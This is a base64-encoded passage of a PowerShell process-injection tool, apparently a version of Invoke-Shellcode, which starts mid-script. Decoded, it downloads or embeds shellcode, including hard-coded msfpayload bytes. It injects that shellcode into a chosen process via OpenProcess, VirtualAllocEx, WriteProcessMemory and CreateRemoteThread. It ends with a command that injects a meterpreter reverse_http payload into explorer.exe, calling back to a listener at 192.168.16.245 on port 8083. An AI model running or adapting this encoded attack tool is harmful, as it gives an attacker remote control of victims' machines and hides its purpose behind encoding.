N0LkFkZHJlc3MgPSAkUHJveHlBZGRyZXNzCiAgICAgICAgICAgICAgICAkV2ViUHJveHlPYmplY3QuVXNlRGVmYXVsdENyZWRlbnRpYWxzID0gJFRydWUKICAgICAgICAgICAgICAgICRXZWJDbGllbnRPYmplY3QuUHJveHkgPSAkV2ViUHJveHlPYmplY3QKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgdHJ5CiAgICAgICAgewogICAgICAgICAgICBbQnl0ZVtdXSAkU2hlbGxjb2RlMzIgPSAkV2ViQ2xpZW50LkRvd25sb2FkRGF0YSgkVXJpKQogICAgICAgIH0KICAgICAgICBjYXRjaAogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIiQoJEVycm9yWzBdLkV4Y2VwdGlvbi5Jbm5lckV4Y2VwdGlvbi5Jbm5lckV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICB9CiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTY0ID0gJFNoZWxsY29kZTMyCgogICAgfQogICAgZWxzZWlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NoZWxsY29kZSddKQogICAgewogICAgICAgICMgVXNlcnMgcGFzc2luZyBpbiBzaGVsbGNvZGUgIHRocm91Z2ggdGhlICctU2hlbGxjb2RlJyBwYXJhbWV0ZXIgYXJlIHJlc3BvbnNpYmxlIGZvciBlbnN1cmluZyBpdCB0YXJnZXRzCiAgICAgICAgIyB0aGUgY29ycmVjdCBhcmNoaXRlY2h0dXJlIC0geDg2IHZzLiB4NjQuIFRoaXMgc2NyaXB0IGhhcyBubyB3YXkgdG8gdmFsaWRhdGUgd2hhdCB5b3UgcHJvdmlkZSBpdC4KICAgICAgICBbQnl0ZVtdXSAkU2hlbGxjb2RlMzIgPSAkU2hlbGxjb2RlCiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTY0ID0gJFNoZWxsY29kZTMyCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgIyBQb3AgYSBjYWxjLi4uIG9yIHdoYXRldmVyIHNoZWxsY29kZSB5b3UgZGVjaWRlIHRvIHBsYWNlIGluIGhlcmUKICAgICAgICAjIEkgc2luY2VyZWx5IGhvcGUgeW91IHRydXN0IHRoYXQgdGhpcyBzaGVsbGNvZGUgYWN0dWFsbHkgcG9wcyBhIGNhbGMuLi4KICAgICAgICAjIEluc2VydCB5b3VyIHNoZWxsY29kZSBoZXJlIGluIHRoZSBmb3IgMHhYWCwweFhYLC4uLgogICAgICAgICMgMzItYml0IHBheWxvYWQKICAgICAgICAjIG1zZnBheWxvYWQgd2luZG93cy9leGVjIENNRD0iY21kIC9rIGNhbGMiIEVYSVRGVU5DPXRocmVhZAogICAgICAgIFtCeXRlW11dICRTaGVsbGNvZGUzMiA9IEAoMHhmYywweGU4LDB4ODksMHgwMCwweDAwLDB4MDAsMHg2MCwweDg5LDB4ZTUsMHgzMSwweGQyLDB4NjQsMHg4YiwweDUyLDB4MzAsMHg4YiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NTIsMHgwYywweDhiLDB4NTIsMHgxNCwweDhiLDB4NzIsMHgyOCwweDBmLDB4YjcsMHg0YSwweDI2LDB4MzEsMHhmZiwweDMxLDB4YzAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGFjLDB4M2MsMHg2MSwweDdjLDB4MDIsMHgyYywweDIwLDB4YzEsMHhjZiwweDBkLDB4MDEsMHhjNywweGUyLDB4ZjAsMHg1MiwweDU3LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4YiwweDUyLDB4MTAsMHg4YiwweDQyLDB4M2MsMHgwMSwweGQwLDB4OGIsMHg0MCwweDc4LDB4ODUsMHhjMCwweDc0LDB4NGEsMHgwMSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4ZDAsMHg1MCwweDhiLDB4NDgsMHgxOCwweDhiLDB4NTgsMHgyMCwweDAxLDB4ZDMsMHhlMywweDNjLDB4NDksMHg4YiwweDM0LDB4OGIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAxLDB4ZDYsMHgzMSwweGZmLDB4MzEsMHhjMCwweGFjLDB4YzEsMHhjZiwweDBkLDB4MDEsMHhjNywweDM4LDB4ZTAsMHg3NSwweGY0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMywweDdkLDB4ZjgsMHgzYiwweDdkLDB4MjQsMHg3NSwweGUyLDB4NTgsMHg4YiwweDU4LDB4MjQsMHgwMSwweGQzLDB4NjYsMHg4YiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MGMsMHg0YiwweDhiLDB4NTgsMHgxYywweDAxLDB4ZDMsMHg4YiwweDA0LDB4OGIsMHgwMSwweGQwLDB4ODksMHg0NCwweDI0LDB4MjQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDViLDB4NWIsMHg2MSwweDU5LDB4NWEsMHg1MSwweGZmLDB4ZTAsMHg1OCwweDVmLDB4NWEsMHg4YiwweDEyLDB4ZWIsMHg4NiwweDVkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg2YSwweDAxLDB4OGQsMHg4NSwweGI5LDB4MDAsMHgwMCwweDAwLDB4NTAsMHg2OCwweDMxLDB4OGIsMHg2ZiwweDg3LDB4ZmYsMHhkNSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4YmIsMHhlMCwweDFkLDB4MmEsMHgwYSwweDY4LDB4YTYsMHg5NSwweGJkLDB4OWQsMHhmZiwweGQ1LDB4M2MsMHgwNiwweDdjLDB4MGEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDgwLDB4ZmIsMHhlMCwweDc1LDB4MDUsMHhiYiwweDQ3LDB4MTMsMHg3MiwweDZmLDB4NmEsMHgwMCwweDUzLDB4ZmYsMHhkNSwweDYzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg2MSwweDZjLDB4NjMsMHgwMCkKCiAgICAgICAgIyA2NC1iaXQgcGF5bG9hZAogICAgICAgICMgbXNmcGF5bG9hZCB3aW5kb3dzL3g2NC9leGVjIENNRD0iY2FsYyIgRVhJVEZVTkM9dGhyZWFkCiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTY0ID0gQCgweGZjLDB4NDgsMHg4MywweGU0LDB4ZjAsMHhlOCwweGMwLDB4MDAsMHgwMCwweDAwLDB4NDEsMHg1MSwweDQxLDB4NTAsMHg1MiwweDUxLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1NiwweDQ4LDB4MzEsMHhkMiwweDY1LDB4NDgsMHg4YiwweDUyLDB4NjAsMHg0OCwweDhiLDB4NTIsMHgxOCwweDQ4LDB4OGIsMHg1MiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MjAsMHg0OCwweDhiLDB4NzIsMHg1MCwweDQ4LDB4MGYsMHhiNywweDRhLDB4NGEsMHg0ZCwweDMxLDB4YzksMHg0OCwweDMxLDB4YzAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGFjLDB4M2MsMHg2MSwweDdjLDB4MDIsMHgyYywweDIwLDB4NDEsMHhjMSwweGM5LDB4MGQsMHg0MSwweDAxLDB4YzEsMHhlMiwweGVkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1MiwweDQxLDB4NTEsMHg0OCwweDhiLDB4NTIsMHgyMCwweDhiLDB4NDIsMHgzYywweDQ4LDB4MDEsMHhkMCwweDhiLDB4ODAsMHg4OCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4NDgsMHg4NSwweGMwLDB4NzQsMHg2NywweDQ4LDB4MDEsMHhkMCwweDUwLDB4OGIsMHg0OCwweDE4LDB4NDQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDhiLDB4NDAsMHgyMCwweDQ5LDB4MDEsMHhkMCwweGUzLDB4NTYsMHg0OCwweGZmLDB4YzksMHg0MSwweDhiLDB4MzQsMHg4OCwweDQ4LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMSwweGQ2LDB4NGQsMHgzMSwweGM5LDB4NDgsMHgzMSwweGMwLDB4YWMsMHg0MSwweGMxLDB4YzksMHgwZCwweDQxLDB4MDEsMHhjMSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MzgsMHhlMCwweDc1LDB4ZjEsMHg0YywweDAzLDB4NGMsMHgyNCwweDA4LDB4NDUsMHgzOSwweGQxLDB4NzUsMHhkOCwweDU4LDB4NDQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDhiLDB4NDAsMHgyNCwweDQ5LDB4MDEsMHhkMCwweDY2LDB4NDEsMHg4YiwweDBjLDB4NDgsMHg0NCwweDhiLDB4NDAsMHgxYywweDQ5LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMSwweGQwLDB4NDEsMHg4YiwweDA0LDB4ODgsMHg0OCwweDAxLDB4ZDAsMHg0MSwweDU4LDB4NDEsMHg1OCwweDVlLDB4NTksMHg1YSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NDEsMHg1OCwweDQxLDB4NTksMHg0MSwweDVhLDB4NDgsMHg4MywweGVjLDB4MjAsMHg0MSwweDUyLDB4ZmYsMHhlMCwweDU4LDB4NDEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDU5LDB4NWEsMHg0OCwweDhiLDB4MTIsMHhlOSwweDU3LDB4ZmYsMHhmZiwweGZmLDB4NWQsMHg0OCwweGJhLDB4MDEsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4NDgsMHg4ZCwweDhkLDB4MDEsMHgwMSwweDAwLDB4MDAsMHg0MSwweGJhLDB4MzEsMHg4YiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NmYsMHg4NywweGZmLDB4ZDUsMHhiYiwweGUwLDB4MWQsMHgyYSwweDBhLDB4NDEsMHhiYSwweGE2LDB4OTUsMHhiZCwweDlkLDB4ZmYsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGQ1LDB4NDgsMHg4MywweGM0LDB4MjgsMHgzYywweDA2LDB4N2MsMHgwYSwweDgwLDB4ZmIsMHhlMCwweDc1LDB4MDUsMHhiYiwweDQ3LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgxMywweDcyLDB4NmYsMHg2YSwweDAwLDB4NTksMHg0MSwweDg5LDB4ZGEsMHhmZiwweGQ1LDB4NjMsMHg2MSwweDZjLDB4NjMsMHgwMCkKICAgIH0KCiAgICBpZiAoICRQU0JvdW5kUGFyYW1ldGVyc1snUHJvY2Vzc0lEJ10gKQogICAgewogICAgICAgICMgSW5qZWN0IHNoZWxsY29kZSBpbnRvIHRoZSBzcGVjaWZpZWQgcHJvY2VzcyBJRAogICAgICAgICRPcGVuUHJvY2Vzc0FkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIE9wZW5Qcm9jZXNzCiAgICAgICAgJE9wZW5Qcm9jZXNzRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW1VJbnQzMl0sIFtCb29sXSwgW1VJbnQzMl0pIChbSW50UHRyXSkKICAgICAgICAkT3BlblByb2Nlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkT3BlblByb2Nlc3NBZGRyLCAkT3BlblByb2Nlc3NEZWxlZ2F0ZSkKICAgICAgICAkVmlydHVhbEFsbG9jRXhBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2NFeAogICAgICAgICRWaXJ0dWFsQWxsb2NFeERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VpbnQzMl0sIFtVSW50MzJdLCBbVUludDMyXSkgKFtJbnRQdHJdKQogICAgICAgICRWaXJ0dWFsQWxsb2NFeCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsQWxsb2NFeEFkZHIsICRWaXJ0dWFsQWxsb2NFeERlbGVnYXRlKQogICAgICAgICRXcml0ZVByb2Nlc3NNZW1vcnlBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBXcml0ZVByb2Nlc3NNZW1vcnkKICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbQnl0ZVtdXSwgW1VJbnQzMl0sIFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFdyaXRlUHJvY2Vzc01lbW9yeUFkZHIsICRXcml0ZVByb2Nlc3NNZW1vcnlEZWxlZ2F0ZSkKICAgICAgICAkQ3JlYXRlUmVtb3RlVGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgQ3JlYXRlUmVtb3RlVGhyZWFkCiAgICAgICAgJENyZWF0ZVJlbW90ZVRocmVhZERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdKSAoW0ludFB0cl0pCiAgICAgICAgJENyZWF0ZVJlbW90ZVRocmVhZCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRDcmVhdGVSZW1vdGVUaHJlYWRBZGRyLCAkQ3JlYXRlUmVtb3RlVGhyZWFkRGVsZWdhdGUpCiAgICAgICAgJENsb3NlSGFuZGxlQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgQ2xvc2VIYW5kbGUKICAgICAgICAkQ2xvc2VIYW5kbGVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSkgKFtCb29sXSkKICAgICAgICAkQ2xvc2VIYW5kbGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ2xvc2VIYW5kbGVBZGRyLCAkQ2xvc2VIYW5kbGVEZWxlZ2F0ZSkKICAgIAogICAgICAgIFdyaXRlLVZlcmJvc2UgIkluamVjdGluZyBzaGVsbGNvZGUgaW50byBQSUQ6ICRQcm9jZXNzSWQiCiAgICAgICAgCiAgICAgICAgaWYgKCAkRm9yY2UgLW9yICRwc0NtZGxldC5TaG91bGRDb250aW51ZSggJ0RvIHlvdSB3aXNoIHRvIGNhcnJ5IG91dCB5b3VyIGV2aWwgcGxhbnM/JywKICAgICAgICAgICAgICAgICAiSW5qZWN0aW5nIHNoZWxsY29kZSBpbmplY3RpbmcgaW50byAkKChHZXQtUHJvY2VzcyAtSWQgJFByb2Nlc3NJZCkuUHJvY2Vzc05hbWUpICgkUHJvY2Vzc0lkKSEiICkgKQogICAgICAgIHsKICAgICAgICAgICAgSW5qZWN0LVJlbW90ZVNoZWxsY29kZSAkUHJvY2Vzc0lkCiAgICAgICAgfQogICAgfQogICAgZWxzZQogICAgewogICAgICAgICMgSW5qZWN0IHNoZWxsY29kZSBpbnRvIHRoZSBjdXJyZW50bHkgcnVubmluZyBQb3dlclNoZWxsIHByb2Nlc3MKICAgICAgICAkVmlydHVhbEFsbG9jQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgVmlydHVhbEFsbG9jCiAgICAgICAgJFZpcnR1YWxBbGxvY0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pCiAgICAgICAgJFZpcnR1YWxBbGxvYyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsQWxsb2NBZGRyLCAkVmlydHVhbEFsbG9jRGVsZWdhdGUpCiAgICAgICAgJFZpcnR1YWxGcmVlQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgVmlydHVhbEZyZWUKICAgICAgICAkVmlydHVhbEZyZWVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VpbnQzMl0sIFtVSW50MzJdKSAoW0Jvb2xdKQogICAgICAgICRWaXJ0dWFsRnJlZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsRnJlZUFkZHIsICRWaXJ0dWFsRnJlZURlbGVnYXRlKQogICAgICAgICRDcmVhdGVUaHJlYWRBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBDcmVhdGVUaHJlYWQKICAgICAgICAkQ3JlYXRlVGhyZWFkRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSkgKFtJbnRQdHJdKQogICAgICAgICRDcmVhdGVUaHJlYWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ3JlYXRlVGhyZWFkQWRkciwgJENyZWF0ZVRocmVhZERlbGVnYXRlKQogICAgICAgICRXYWl0Rm9yU2luZ2xlT2JqZWN0QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgV2FpdEZvclNpbmdsZU9iamVjdAogICAgICAgICRXYWl0Rm9yU2luZ2xlT2JqZWN0RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnQzMl0pIChbSW50XSkKICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRXYWl0Rm9yU2luZ2xlT2JqZWN0QWRkciwgJFdhaXRGb3JTaW5nbGVPYmplY3REZWxlZ2F0ZSkKICAgICAgICAKICAgICAgICBXcml0ZS1WZXJib3NlICJJbmplY3Rpbmcgc2hlbGxjb2RlIGludG8gUG93ZXJTaGVsbCIKICAgICAgICAKICAgICAgICBpZiAoICRGb3JjZSAtb3IgJHBzQ21kbGV0LlNob3VsZENvbnRpbnVlKCAnRG8geW91IHdpc2ggdG8gY2Fycnkgb3V0IHlvdXIgZXZpbCBwbGFucz8nLAogICAgICAgICAgICAgICAgICJJbmplY3Rpbmcgc2hlbGxjb2RlIGludG8gdGhlIHJ1bm5pbmcgUG93ZXJTaGVsbCBwcm9jZXNzISIgKSApCiAgICAgICAgewogICAgICAgICAgICBJbmplY3QtTG9jYWxTaGVsbGNvZGUKICAgICAgICB9CiAgICB9ICAgCn0KCgoKJFByb2MgPSBHZXQtUHJvY2VzcyBleHBsb3JlcgpJbnZva2UtU2hlbGxjb2RlIC1Qcm9jZXNzSWQgJFByb2MuSWQgLVBheWxvYWQgd2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHAgLUxob3N0IDE5Mi4xNjguMTYuMjQ1IC1McG9ydCA4MDgzIC1WZXJib3Nl
